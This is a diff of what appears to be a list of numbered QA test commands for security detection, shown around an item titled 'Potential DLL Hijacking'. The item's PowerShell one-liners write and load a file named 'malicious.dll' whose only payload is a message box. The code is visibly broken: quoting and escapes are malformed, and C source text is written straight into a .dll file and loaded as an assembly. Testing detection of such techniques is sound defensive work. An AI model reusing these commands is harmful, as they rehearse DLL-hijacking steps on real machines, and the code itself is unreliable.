@@ -70,7 +70,8 @@ Start-Process -FilePath "msdt.exe"
 24. QA_Potential DLL Hijacking
 $code = '[DllImport(\kernel32.dll\")]`npublic static extern IntPtr LoadLibrary(string dllToLoad);`n`npublic static void Main(){`n    string dllPath = \"C:\\\\Path\\\\to\\\\malicious.dll\";`n    LoadLibrary(dllPath);`n}' | Out-File -FilePath C:\\malicious.cs -Encoding ASCII; Add-Type -TypeDefinition $code -Language CSharp; Start-Process -FilePath 'notepad.exe' -ArgumentList 'C:\\malicious.dll'"
 
-"@#include <windows.h> BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { switch (fdwReason) { case DLL_PROCESS_ATTACH: MessageBoxA(NULL, 'Malicious DLL loaded!', 'DLL Hijacking', MB_OK | MB_ICONWARNING); break; case DLL_PROCESS_DETACH: break; } return TRUE; }" | Out-File -FilePath 'C:\Temp\Malicious.dll' -Encoding ASCII -Force; try {[Reflection.Assembly]::LoadFile('C:\Temp\Malicious.dll')} catch {Write-Output "Failed to load DLL: $_"}
+"@#include <windows.h> BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { switch (fdwReason) { case DLL_PROCESS_ATTACH: MessageBoxA(NULL, 'Malicious DLL loaded!', 'DLL Hijacking', MB_OK | MB_ICONWARNING); break; case DLL_PROCESS_DETACH: break; } return TRUE; }" | Out-File -FilePath 'C:\Temp\Malicious.dll' -Encoding ASCII -Force; try {[System.Reflection.Assembly]::LoadFile('C:\Temp\Malicious.dll')} catch {Write-Output "Failed to load DLL: $_"}
+
 
 
 
